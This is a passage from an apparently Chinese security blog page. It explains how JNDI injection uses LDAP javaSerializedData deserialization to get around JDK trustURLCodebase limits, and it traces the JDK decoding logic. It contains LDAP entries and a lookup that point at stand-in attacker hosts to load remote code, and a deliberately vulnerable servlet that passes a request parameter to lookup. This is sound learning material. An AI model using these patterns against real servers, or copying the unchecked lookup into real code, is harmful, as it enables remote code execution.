@@ -1,0 +1,1261 @@
+<!--
+  ╔══════════════════════════════════════════════════════════════╗
+  ║                                                              ║
+  ║   🎮 CTF Easter Egg Challenge!                               ║
+  ║                                                              ║
+  ║   Congratulations! You found the hidden comment!             ║
+  ║                                                              ║
+  ║   Here's your clue: The flag is the site owner's name        ║
+  ║   in lowercase letters.                                      ║
+  ║                                                              ║
+  ║   Open browser console and type:                             ║
+  ║   secret.flag("your_answer")                                 ║
+  ║                                                              ║
+  ║   Or try: secret.hint() for more clues                       ║
+  ║                                                              ║
+  ╚══════════════════════════════════════════════════════════════╝
+-->
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <style id="waifu-preload">#waifu{opacity:0;background:transparent;}#waifu canvas,#waifu #live2d,#waifu-toolbar{background:transparent;}</style>
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  <link rel="manifest" href="/manifest.json">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Blog">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>JNDI注入 × 反序列化链 × 内存马联动 - blog</title>
+
+  
+    <meta name="description" content="JNDI注入 × 反序列化链 × 内存马联动前言前几篇文章里写了JNDI注入漏洞利用，用的是JNDI+Reference远程类加载的方式去打RCE，但这种方式在高版本JDK下会被默认禁用，实战里经常打不通。本篇来看另一种JNDI注入方式——利用LDAP配合反序列化链，绕过trustURLCodebase的限制，最后再把反序列化payload换成内存马注入，完成一条完整的无文件落地攻击链。  目录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI注入 × 反序列化链 × 内存马联动">
+<meta property="og:url" content="https://wr0ld.github.io/posts/a7c3f9e2/">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="JNDI注入 × 反序列化链 × 内存马联动前言前几篇文章里写了JNDI注入漏洞利用，用的是JNDI+Reference远程类加载的方式去打RCE，但这种方式在高版本JDK下会被默认禁用，实战里经常打不通。本篇来看另一种JNDI注入方式——利用LDAP配合反序列化链，绕过trustURLCodebase的限制，最后再把反序列化payload换成内存马注入，完成一条完整的无文件落地攻击链。  目录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-04-25T09:26:00.000Z">
+<meta property="article:modified_time" content="2026-04-25T09:28:47.268Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="JNDI">
+<meta property="article:tag" content="内存马">
+<meta property="article:tag" content="LDAP">
+<meta property="article:tag" content="CC3">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="反序列化,JNDI,内存马,LDAP,CC3">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.0.0">
+
+
+  
+    <link rel="shortcut icon" href="/avatar.png">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-25T17:26:00+08:00","dateModified":"2026-04-25T17:28:47+08:00","datePublished":"2026-04-25T17:26:00+08:00","description":"","headline":"JNDI注入 × 反序列化链 × 内存马联动","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/a7c3f9e2/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/a7c3f9e2/","keywords":"反序列化, JNDI, 内存马, LDAP, CC3","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/oQZFvAAISEIwNBgA7TipliAAIPJgALGwUH8qA~tplv-dy-vqe2-sr-v2_1920_1259_q80.jpg","image":1}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">blog</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="实验室" href="/lab/" style="color:#F39C12"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.47 8.47a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.75.75 0 1 1-1.06-1.06L8.94 11L7.47 9.53a.75.75 0 0 1 0-1.06M12 14.25a.75.75 0 0 0 0 1.5h4a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="游戏" href="/games/" style="color:#FF6B6B"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 9.5c0-2.496 0-3.744.494-4.696a4.5 4.5 0 0 1 1.81-1.81C5.256 2.5 6.504 2.5 9 2.5h6c2.496 0 3.744 0 4.696.494a4.5 4.5 0 0 1 1.81 1.81C22 5.756 22 7.004 22 9.5v5c0 2.496 0 3.744-.494 4.696a4.5 4.5 0 0 1-1.81 1.81C18.744 21.5 17.496 21.5 15 21.5H9c-2.496 0-3.744 0-4.696-.494a4.5 4.5 0 0 1-1.81-1.81C2 18.244 2 16.996 2 14.5z" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M6.25 12a.75.75 0 0 1 .75-.75h2.25V9a.75.75 0 0 1 1.5 0v2.25H13a.75.75 0 0 1 0 1.5h-2.25V15a.75.75 0 0 1-1.5 0v-2.25H7a.75.75 0 0 1-.75-.75m9.5-1a1 1 0 1 0 0 2a1 1 0 0 0 0-2m2 3a1 1 0 1 0 2 0a1 1 0 0 0-2 0" clip-rule="evenodd"/></svg></a><a class="nav-item" title="卡牌" href="javascript:if(window.CardSystem)window.CardSystem.showPanel()" style="color:#E91E63"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.5 6.75a.75.75 0 0 0-.75.75v1.5c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75v-1.5a.75.75 0 0 0-.75-.75zm-.75 5.25a.75.75 0 0 1 .75-.75h4.5a.75.75 0 0 1 0 1.5H7.5a.75.75 0 0 1-.75-.75m.75 2.25a.75.75 0 0 0 0 1.5h3a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="设置" href="/settings/" style="color:#9B59B6"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2c-1.5 0-2.5 1.5-2.5 3v.5c0 .5-.5 1-1 1H7c-1.5 0-2.5 1-3 2.5l-.5 2c-.5 1.5.5 3 2 3.5l.5.2c.5.2 1 .7 1 1.3v.5c0 .5-.5 1-1 1.3l-.5.2c-1.5.5-2.5 2-2 3.5l.5 2c.5 1.5 1.5 2.5 3 2.5h1.5c.5 0 1-.5 1-1V20c0-.5.5-1 1-1h2c.5 0 1 .5 1 1v.5c0 .5.5 1 1 1H17c1.5 0 2.5-1 3-2.5l.5-2c.5-1.5-.5-3-2-3.5l-.5-.2c-.5-.2-1-.7-1-1.3v-.5c0-.5.5-1 1-1.3l.5-.2c1.5-.5 2.5-2 2-3.5l-.5-2c-.5-1.5-1.5-2.5-3-2.5h-1.5c-.5 0-1 .5-1 1V6c0 .5-.5 1-1 1h-2c-.5 0-1-.5-1-1v-.5c0-.5-.5-1-1-1" opacity=".5"/><path fill="currentColor" d="M12 15a3 3 0 1 0 0-6a3 3 0 0 0 0 6" clip-rule="evenodd"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper todo-widget collapsible-widget"><div class="widget-header dis-select"><span class="name">任务简报 <span class="todo-count">(12)</span></span><span class="collapse-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="widget-body fs14"><div class="todo-list"><div class="todo-item doing"><span class="todo-content">内存马 → 检测查杀</span></div><div class="todo-item doing"><span class="todo-content">log4j 内存马+jndi urldns grov</span></div><div class="todo-item doing"><span class="todo-content">EDUSRC实战漏洞挖掘复盘脱敏</span></div><div class="todo-item doing"><span class="todo-content">小迪vpc1-5 Windows系统web内网横向域内</span></div><div class="todo-item doing"><span class="todo-content">rootkit 的 shellcode 嵌入</span></div><div class="todo-item doing"><span class="todo-content">fastjson 1.2.68 → 1.2.80</span></div><div class="todo-item doing"><span class="todo-content">java cc4 5 7</span></div><div class="todo-item doing"><span class="todo-content">Shiro 721</span></div><div class="todo-item doing"><span class="todo-content">信息收集</span></div><div class="todo-item doing"><span class="todo-content">PHP反序列化 + Pop Chain构造</span></div><div class="todo-item doing"><span class="todo-content">云上服务</span></div><div class="todo-item doing"><span class="todo-content">docker容器逃逸</span></div></div></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-04-25T09:26:00.000Z">2026-04-25</time></span><span class="sep"></span><span class="text word-count">字数：22414</span><span class="sep"></span><span class="text img-count">图片：15</span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>JNDI注入 × 反序列化链 × 内存马联动</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="JNDI注入-×-反序列化链-×-内存马联动"><a href="#JNDI注入-×-反序列化链-×-内存马联动" class="headerlink" title="JNDI注入 × 反序列化链 × 内存马联动"></a>JNDI注入 × 反序列化链 × 内存马联动</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几篇文章里写了JNDI注入漏洞利用，用的是JNDI+Reference远程类加载的方式去打RCE，但这种方式在高版本JDK下会被默认禁用，实战里经常打不通。本篇来看另一种JNDI注入方式——利用LDAP配合反序列化链，绕过<code>trustURLCodebase</code>的限制，最后再把反序列化payload换成内存马注入，完成一条完整的无文件落地攻击链。</p>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E4%B8%A4%E7%A7%8Djndi%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F%E5%AF%B9%E6%AF%94">两种JNDI注入方式对比</a></li>
+<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%96%B9%E5%BC%8F%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90">反序列化链方式原理分析</a><ul>
+<li><a href="#ldap-entry%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE">LDAP Entry中的序列化数据</a></li>
+<li><a href="#%E8%A7%A6%E5%8F%91%E7%82%B9directorymanager%E6%BA%90%E7%A0%81%E8%BF%BD%E8%B8%AA">触发点：DirectoryManager源码追踪</a></li>
+</ul>
+</li>
+<li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">环境搭建与漏洞复现</a><ul>
+<li><a href="#%E6%90%AD%E5%BB%BA%E6%81%B6%E6%84%8Fldap%E6%9C%8D%E5%8A%A1">搭建恶意LDAP服务</a></li>
+<li><a href="#%E8%A7%A6%E5%8F%91%E9%AA%8C%E8%AF%81">触发验证</a></li>
+</ul>
+</li>
+<li><a href="#%E8%81%94%E5%8A%A8%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5">联动内存马注入</a><ul>
+<li><a href="#%E6%94%BB%E5%87%BB%E9%93%BE%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF">攻击链设计思路</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96standardcontext%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F">获取StandardContext的几种方式</a></li>
+<li><a href="#cmdfilter%E5%86%85%E5%AD%98%E9%A9%AC">CmdFilter内存马</a></li>
+<li><a href="#templatesimpl%E5%8A%A0%E8%BD%BD%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%97%E8%8A%82%E7%A0%81">TemplatesImpl加载内存马字节码</a></li>
+<li><a href="#%E5%AE%8C%E6%95%B4%E6%89%93%E6%B3%95%E6%BC%94%E7%A4%BA">完整打法演示</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+<hr>
+<h2 id="两种JNDI注入方式对比"><a href="#两种JNDI注入方式对比" class="headerlink" title="两种JNDI注入方式对比"></a>两种JNDI注入方式对比</h2><p>在学FastJSON那几篇的时候，打RCE用的思路是：让目标服务器去lookup我们控制的LDAP&#x2F;RMI地址，服务端返回一个Reference对象，里面带着远程类的URL，目标JVM通过URLClassLoader去拉取并加载这个类，执行其中的恶意代码。</p>
+<p>但这条路在高版本JDK里走不通：</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>限制版本</th>
+<th>限制参数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>RMI</td>
+<td>JDK 8u121+</td>
+<td><code>com.sun.jndi.rmi.object.trustURLCodebase=false</code></td>
+</tr>
+<tr>
+<td>LDAP</td>
+<td>JDK 8u191+</td>
+<td><code>com.sun.jndi.ldap.object.trustURLCodebase=false</code></td>
+</tr>
+</tbody></table>
+<p>这两个参数默认关闭之后，JVM直接拒绝加载远程codebase，方式一就废了。</p>
+<hr>
+<p>先放一张两种方式的总览图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260423090125713.png"></p>
+<hr>
+<p><strong>方式一（远程类加载）：RMI 和 LDAP 都可以</strong></p>
+<p>两个协议都支持返回 Reference 对象，触发远程类加载：</p>
+<ul>
+<li><strong>RMI</strong>：Registry 返回 <code>ReferenceWrapper</code>，客户端通过 codebase URL 用 URLClassLoader 拉类</li>
+<li><strong>LDAP</strong>：Entry 里带 <code>javaFactory</code> + <code>javaCodeBase</code> 属性，同样触发远程加载</li>
+</ul>
+<p>限制也各自独立，RMI 被 8u121 封，LDAP 被 8u191 封。</p>
+<hr>
+<p><strong>方式二（反序列化链）：LDAP 可以，RMI 也可以但路子不同</strong></p>
+<ul>
+<li><p><strong>LDAP</strong>（主流）：Entry 里塞 <code>javaSerializedData</code>，客户端 <code>readObject()</code> 触发，这是高版本 JDK 绕过的标准打法。</p>
+</li>
+<li><p><strong>RMI</strong>（但机制不一样）：RMI 协议本身就是基于 Java 序列化传输的，有两条路：</p>
+<ul>
+<li><p>一：marshalsec 起恶意 RMI 服务端，目标连上来反序列化响应触发 RCE。因为 RMI 的结构和 LDAP 不一样，这种方式比较复杂，一般还是用 LDAP 的。</p>
+</li>
+<li><p>二：先把 JRMPClient 链打入目标，目标反序列化后主动回连 JRMP Listener，Listener 吐真正 payload 触发 RCE。这种有些 CMS 就能打，比如 WebLogic 和 Shiro 之类的。</p>
+<ul>
+<li>实际案例：<ul>
+<li><strong>WebLogic</strong>：<code>CVE-2017-3248</code> &#x2F; <code>CVE-2018-2628</code> 等，利用 JRMP 回链。</li>
+<li><strong>Shiro</strong>：存在 Commons Beanutils 链时，可配合 JRMP 绕过某些限制。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>小结一下这几种方式的关系：</strong></p>
+<table>
+<thead>
+<tr>
+<th>能力</th>
+<th>LDAP</th>
+<th>RMI</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>远程类加载（Reference）</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>反序列化利用</td>
+<td>✅（主流）</td>
+<td>✅（复杂）</td>
+</tr>
+<tr>
+<td>JRMPClient 回连攻击</td>
+<td>❌</td>
+<td>✅（独有）</td>
+</tr>
+</tbody></table>
+<p><strong>RMI 独有的 JRMPClient 回连攻击</strong>，典型场景是目标在内网、RMI 端口 1099 你访问不到，但目标能出网。直接打 RMI 端口打不通，就用这种反向回连：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你发 JRMPClient 链 → 目标主动出网连你的 JRMPListener → 你下发 gadget → 二次反序列化 → RCE</span><br></pre></td></tr></table></figure>
+
+<p><strong>WebLogic + Shiro 这类场景很典型</strong>，后面有机会再单独写写。</p>
+<hr>
+<p>方式二针对高版本 JDK 的绕过思路：LDAP 服务端不返回 Reference，而是直接在 Entry 里塞一个序列化好的 Java 对象（放在<code>javaSerializedData</code>属性里）。客户端在处理 LDAP 响应的时候，会对这个序列化数据调用<code>readObject()</code>，如果目标服务器 classpath 里有可用的反序列化链（比如 Commons Collections、Commons Beanutils），就可以直接触发 RCE。</p>
+<p>这个方式不走远程类加载，所以<code>trustURLCodebase</code>管不到它。</p>
+<hr>
+<h2 id="反序列化链方式原理分析"><a href="#反序列化链方式原理分析" class="headerlink" title="反序列化链方式原理分析"></a>反序列化链方式原理分析</h2><h3 id="LDAP-Entry中的序列化数据"><a href="#LDAP-Entry中的序列化数据" class="headerlink" title="LDAP Entry中的序列化数据"></a>LDAP Entry中的序列化数据</h3><p>LDAP 协议里，对象可以有一个特殊属性叫<code>javaSerializedData</code>，值是序列化后的 Java 对象的字节数组。正常的业务场景是用来在目录服务里存 Java 对象用的，但在 JNDI 注入里就变成了传输反序列化 payload 的载体。</p>
+<p>LDAP Entry 大概长这样（简化表示）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dn: cn=exploit,dc=example,dc=com</span><br><span class="line">objectClass: javaObject</span><br><span class="line">objectClass: javaSerializedObject</span><br><span class="line">javaClassName: java.lang.Object</span><br><span class="line">javaSerializedData: &lt;CC链序列化字节&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对比一下远程加载模式的 Entry：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dn: cn=exploit,dc=example,dc=com</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: javaObject</span><br><span class="line">objectClass: javaNamingReference</span><br><span class="line">javaClassName: Exploit</span><br><span class="line">javaFactory: Exploit</span><br><span class="line">javaCodeBase: http://攻击者IP:8888/</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>远程类加载</th>
+<th>反序列化</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>objectClass</td>
+<td>javaNamingReference</td>
+<td>javaSerializedObject</td>
+</tr>
+<tr>
+<td>核心属性</td>
+<td>javaFactory + javaCodeBase</td>
+<td>javaSerializedData</td>
+</tr>
+<tr>
+<td>内容</td>
+<td>工厂类名 + 远程URL</td>
+<td>序列化字节数组</td>
+</tr>
+</tbody></table>
+<p>客户端调用<code>context.lookup(&quot;ldap://attacker.com/exploit&quot;)</code>的时候，会收到这个 Entry 并解析里面的<code>javaSerializedData</code>。有<code>javaSerializedData</code>的话就走反序列化，不会再去执行远程下载了。</p>
+<h3 id="触发点：DirectoryManager源码追踪"><a href="#触发点：DirectoryManager源码追踪" class="headerlink" title="触发点：DirectoryManager源码追踪"></a>触发点：DirectoryManager源码追踪</h3><p>在 JDK 源码里，<code>com.sun.jndi.ldap.Obj</code>类里的<code>decodeObject()</code>方法负责处理 LDAP 返回的对象：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260423200803819.png"></p>
+<blockquote>
+<p><code>JAVA_ATTRIBUTES</code> 里的数据就是 Entry 的字段映射</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260423200849738.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">JAVA_ATTRIBUTES[0] = &quot;objectClass&quot;</span><br><span class="line">JAVA_ATTRIBUTES[1] = &quot;javaSerializedData&quot;</span><br><span class="line">JAVA_ATTRIBUTES[2] = &quot;javaClassName&quot;</span><br><span class="line">JAVA_ATTRIBUTES[3] = &quot;javaFactory&quot;</span><br><span class="line">JAVA_ATTRIBUTES[4] = &quot;javaCodeBase&quot;</span><br><span class="line">JAVA_ATTRIBUTES[5] = &quot;javaReferenceAddress&quot;</span><br><span class="line">JAVA_ATTRIBUTES[6] = &quot;javaClassNames&quot;</span><br><span class="line">JAVA_ATTRIBUTES[7] = &quot;javaRemoteLocation&quot;</span><br></pre></td></tr></table></figure>
+
+<p>判断逻辑是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">检查 javaSerializedData</span><br><span class="line">  ├── 有 → deserializeObject() → 反序列化路线  ← 我们走这条</span><br><span class="line">  ├── 没有，检查 javaRemoteObject</span><br><span class="line">  │     └── 有 → decodeRmiObject() → RMI对象路线</span><br><span class="line">  └── 没有，检查 objectClass 是否为 javaNamingReference</span><br><span class="line">        ├── 是 → decodeReference() → 远程类加载路线</span><br><span class="line">        └── 都不是 → return null</span><br></pre></td></tr></table></figure>
+
+<p><strong>优先级从高到低：反序列化 &gt; RMI对象 &gt; 远程类加载</strong>，所以高版本 JDK 封掉远程类加载之后，反序列化那条路完全不受影响，因为走的是第一个分支，根本没走到<code>decodeReference()</code>。</p>
+<p>发现<code>javaSerializedData</code>属性后，就会调用<code>deserializeObject()</code>，里面就是<code>ObjectInputStream.readObject()</code>，走标准 Java 反序列化流程，反序列化链在这里触发。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260423213859508.png"></p>
+<hr>
+<h2 id="环境搭建与漏洞复现"><a href="#环境搭建与漏洞复现" class="headerlink" title="环境搭建与漏洞复现"></a>环境搭建与漏洞复现</h2><p>还是用上次写的 JNDI 模拟注入的 web 页面：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注解，将当前类标记为一个 Servlet，并指定其访问路径为 /vuln</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 请求 GET /vuln?url=xxx，则 url 的值为 xxx</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建一个 JNDI 的 InitialContext 对象</span></span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="comment">// 漏洞点：参数可控，触发 JNDI lookup</span></span><br><span class="line">            ctx.lookup(url);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            resp.getWriter().println(<span class="string">&quot;error: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
